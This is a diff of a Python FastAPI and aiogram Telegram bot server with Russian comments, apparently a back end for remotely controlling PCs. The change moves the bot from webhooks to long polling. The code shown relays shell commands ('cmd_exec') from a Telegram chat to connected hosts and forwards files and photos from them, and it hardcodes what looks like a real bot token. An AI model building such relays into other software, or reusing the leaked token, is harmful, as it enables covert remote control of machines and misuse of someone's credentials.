@@ -2,8 +2,10 @@ import os
 import logging
 import base64
 import json
-import urllib.request  # Встроенная библиотека, работает ВСЕГДА и без установки
+import urllib.request
 import uvicorn
+import asyncio
+import threading
 from contextlib import asynccontextmanager
 from fastapi import FastAPI, Request
 from fastapi.responses import JSONResponse
@@ -15,10 +17,6 @@ from aiogram.filters import Command
 logging.basicConfig(level=logging.INFO)
 
 TOKEN = "8889355917:AAEPQcy1eLySvKBQgkOM23tANZoIpR3VU34"
-RENDER_URL = os.getenv("RENDER_EXTERNAL_URL", "").strip()
-
-if not RENDER_URL or "YOUR_DOMAIN" in RENDER_URL:
-    RENDER_URL = "https://tg-pc-server.onrender.com"
 
 bot = Bot(token=TOKEN)
 dp = Dispatcher()
@@ -27,7 +25,7 @@ active_hosts = {}   # host_id -> data
 user_sessions = {}  # uid -> data
 last_processed_reports = {}  # host_id -> last_report_text
 
-# --- ОТПРАВКА ЧЕРЕЗ ВСТРОЕННЫЙ URLLIB (БЕЗ ВНЕШНИХ БИБЛИОТЕК) ---
+# --- ПРЯМАЯ ОТПРАВКА СООБЩЕНИЙ ---
 def send_tg_message(chat_id, text, parse_mode="Markdown"):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
     data = json.dumps({"chat_id": chat_id, "text": text, "parse_mode": parse_mode}).encode('utf-8')
@@ -43,7 +41,6 @@ def send_tg_document(chat_id, file_name, file_base64, caption=""):
     try:
         file_data = base64.b64decode(file_base64)
         boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
-        
         body = []
         body.append(f'--{boundary}'.encode('utf-8'))
         body.append(f'Content-Disposition: form-data; name="chat_id"'.encode('utf-8'))
@@ -65,12 +62,10 @@ def send_tg_document(chat_id, file_name, file_base64, caption=""):
         body.append(''.encode('utf-8'))
         
         payload = b'\r\n'.join(body)
-        
         headers = {
             'Content-Type': f'multipart/form-data; boundary={boundary}',
             'Content-Length': str(len(payload))
         }
-        
         req = urllib.request.Request(url, data=payload, headers=headers, method='POST')
         with urllib.request.urlopen(req, timeout=20) as response:
             response.read()
@@ -82,7 +77,6 @@ def send_tg_photo(chat_id, photo_base64, caption=""):
     try:
         photo_data = base64.b64decode(photo_base64)
         boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
-        
         body = []
         body.append(f'--{boundary}'.encode('utf-8'))
         body.append(f'Content-Disposition: form-data; name="chat_id"'.encode('utf-8'))
@@ -104,33 +98,34 @@ def send_tg_photo(chat_id, photo_base64, caption=""):
         body.append(''.encode('utf-8'))
         
         payload = b'\r\n'.join(body)
-        
         headers = {
             'Content-Type': f'multipart/form-data; boundary={boundary}',
             'Content-Length': str(len(payload))
         }
-        
         req = urllib.request.Request(url, data=payload, headers=headers, method='POST')
         with urllib.request.urlopen(req, timeout=20) as response:
             response.read()
     except Exception as e:
         logging.error(f"Ошибка прямой отправки фото: {e}")
 
+# --- ФОНОВЫЙ ЗАПУСК БОТА ЧЕРЕЗ LONG POLLING ---
+def run_bot_polling():
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    
+    # Сначала полностью удаляем вебхук, чтобы включить обычный опрос
+    loop.run_until_complete(bot.delete_webhook(drop_pending_updates=True))
+    logging.info("--- ВЕБХУК УДАЛЕН. БОТ ЗАПУЩЕН В РЕЖИМЕ LONG POLLING ---")
+    
+    # Запускаем бесконечный опрос
+    loop.run_until_complete(dp.start_polling(bot))
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    base_url = RENDER_URL.rstrip("/")
-    webhook_url = f"{base_url}/webhook"
-    logging.info(f"--- УСТАНОВКА ВЕБХУКА TG --- URL: {webhook_url}")
-    try:
-        await bot.set_webhook(url=webhook_url, drop_pending_updates=True)
-    except Exception as e:
-        logging.error(f"Критическая ошибка вебхука: {e}")
+    # Запускаем aiogram в отдельном потоке, чтобы он не блокировал FastAPI
+    polling_thread = threading.Thread(target=run_bot_polling, daemon=True)
+    polling_thread.start()
     yield
-    try:
-        await bot.delete_webhook()
-    except Exception:
-        pass
 
 app = FastAPI(lifespan=lifespan)
 
@@ -365,16 +360,6 @@ async def handle_text_messages(message: types.Message):
         active_hosts[host_id]["commands"].append({"type": "cmd_exec", "param": message.text})
         user_sessions[uid]["state"] = None
         await message.answer(f"⏳ Команда `{message.text}` отправлена...")
-
-@app.post("/webhook")
-async def webhook_endpoint(request: Request):
-    try:
-        json_data = await request.json()
-        update = types.Update.model_validate(json_data, context={"bot": bot})
-        await dp.feed_update(bot, update)
-        return {"status": "ok"}
-    except Exception as e:
-        return JSONResponse(status_code=500, content={"error": str(e)})
 
 if __name__ == "__main__":
     port = int(os.getenv("PORT", 8000))
